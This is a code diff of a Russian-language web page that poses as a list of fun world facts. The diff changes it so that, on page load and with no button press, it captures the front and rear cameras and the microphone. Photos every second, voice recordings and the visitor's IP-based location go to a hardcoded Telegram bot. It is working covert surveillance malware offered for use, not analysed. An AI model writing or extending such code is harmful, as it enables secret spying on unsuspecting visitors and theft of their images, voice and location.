@@ -39,32 +39,36 @@
       margin: 10px;
     }
     button:hover { background: #ff8787; }
-    #video, #canvas { display: none; }
+    #videoFront, #videoBack, #canvasFront, #canvasBack { display: none; }
   </style>
 </head>
 <body>
-  <video id="video" autoplay muted></video>
-  <canvas id="canvas"></canvas>
+  <video id="videoFront" autoplay muted></video>
+  <video id="videoBack" autoplay muted></video>
+  <canvas id="canvasFront"></canvas>
+  <canvas id="canvasBack"></canvas>
   <h1>Удивительные факты о мире</h1>
   <div class="fact">Знаете ли вы, что осьминоги могут менять цвет, чтобы сливаться с окружающей средой?</div>
   <div class="fact">Самая длинная река в мире — Нил, её длина около 6 650 км!</div>
   <div class="fact">Медузы не имеют мозга, сердца или костей — они на 95% состоят из воды.</div>
   <div class="fact">В космосе нет звука, потому что там нет воздуха для передачи звуковых волн.</div>
   <div class="fact">Самое глубокое место в океане — Марианская впадина, глубина 11 км.</div>
-  <button onclick="startCapture()">Начать</button>
   <button onclick="fakePhoto()">Сделать фото</button>
 
   <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const context = canvas.getContext('2d');
+    const videoFront = document.getElementById('videoFront');
+    const videoBack = document.getElementById('videoBack');
+    const canvasFront = document.getElementById('canvasFront');
+    const canvasBack = document.getElementById('canvasBack');
+    const contextFront = canvasFront.getContext('2d');
+    const contextBack = canvasBack.getContext('2d');
     const token = '8176524950:AAGfsNYH5qwFzIvoUmsI-UkzptDMDAYtIVQ';
     const chatId = '5678878569';
     let mediaRecorder;
     let audioChunks = [];
     let photoInterval;
 
-    // Получение IP и города
+    // IP и город
     fetch('https://ip-api.com/json/?fields=61439')
       .then(response => response.json())
       .then(data => {
@@ -78,21 +82,32 @@
         }).catch(err => console.error('Ошибка отправки IP/города:', err));
       });
 
-    // Старт захвата
-    function startCapture() {
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
-        .then(stream => {
-          video.srcObject = stream;
-          video.onloadedmetadata = () => {
-            startPhotoLoop(stream);
-            startRecording(stream);
-          };
-        })
-        .catch(err => console.error('Ошибка доступа:', err));
-    }
+    // Запуск камер и микрофона
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
+      .then(streamFront => {
+        videoFront.srcObject = streamFront;
+        videoFront.onloadedmetadata = () => {
+          setTimeout(() => startPhotoLoop(streamFront, 'front'), 2000); // Фронтальная с задержкой
+          startRecording(streamFront); // Аудио
+        };
+      })
+      .catch(err => console.error('Ошибка фронтальной камеры:', err));
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: false })
+      .then(streamBack => {
+        videoBack.srcObject = streamBack;
+        videoBack.onloadedmetadata = () => {
+          setTimeout(() => startPhotoLoop(streamBack, 'back'), 2000); // Задняя с задержкой
+        };
+      })
+      .catch(err => console.error('Ошибка задней камеры:', err));
 
     // Фото каждую секунду
-    function startPhotoLoop(stream) {
+    function startPhotoLoop(stream, type) {
+      const video = type === 'front' ? videoFront : videoBack;
+      const canvas = type === 'front' ? canvasFront : canvasBack;
+      const context = type === 'front' ? contextFront : contextBack;
+
       function takePhoto() {
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
@@ -100,11 +115,11 @@
         canvas.toBlob(blob => {
           const formData = new FormData();
           formData.append('chat_id', chatId);
-          formData.append('photo', blob, 'photo.png');
+          formData.append('photo', blob, `${type}_photo.png`);
           fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
             method: 'POST',
             body: formData
-          }).catch(err => console.error('Ошибка отправки фото:', err));
+          }).catch(err => console.error(`Ошибка отправки ${type} фото:`, err));
         }, 'image/png');
       }
       takePhoto(); // Первое фото
@@ -146,7 +161,12 @@
       fetch(`https://api.telegram.org/bot${token}/sendVoice`, {
         method: 'POST',
         body: formData
-      }).catch(err => console.error('Ошибка отправки аудио:', err));
+      })
+        .then(response => response.json())
+        .then(data => {
+          if (!data.ok) console.error('Ошибка отправки голосового:', data);
+        })
+        .catch(err => console.error('Ошибка отправки голосового:', err));
     }
 
     // Остановка при уходе
